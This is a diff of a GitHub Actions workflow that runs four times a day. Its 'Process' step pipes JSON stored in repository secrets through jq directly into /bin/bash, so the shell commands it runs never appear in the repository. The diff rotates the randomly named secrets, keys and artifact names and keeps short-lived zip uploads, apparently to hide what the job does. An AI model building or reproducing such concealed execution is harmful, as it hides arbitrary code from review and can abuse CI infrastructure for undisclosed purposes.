@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '35 4,10,16,22 * * *'
+    - cron: '18 2,8,14,20 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -15,21 +15,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          m1: ${{ secrets.m1 }}
+          ku3: ${{ secrets.ku3 }}
         run: |
-          printf '%s' "$m1" | jq -r .ksp25948 | /bin/bash
-          printf '%s' "$ii6" | jq -r .crdk870 | /bin/bash
-          echo $mo255 | jq -r .deck9260 | /bin/bash
-          echo $rchl36 | jq -r .bua685 | /bin/bash
-          printf '%s' "$tgcg4745" | jq -r .tcdes949 | /bin/bash
-          echo $aqw63978 | jq -r .i37 | /bin/bash
-          printf '%s' "$lamv6728" | jq -r .oxja10 | /bin/bash
-          echo $rpfrf6090 | jq -r .dwmku63519 | /bin/bash
+          printf '%s' "$ku3" | jq -r .oten923 | /bin/bash
+          echo $thhdt3855 | jq -r .hvv0139 | /bin/bash
+          printf '%s' "$xa5303" | jq -r .i3423 | /bin/bash
 
       - name: Archive output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: qehl2l00
+          name: GzBtatmQ
           path: "*.zip"
           retention-days: 1
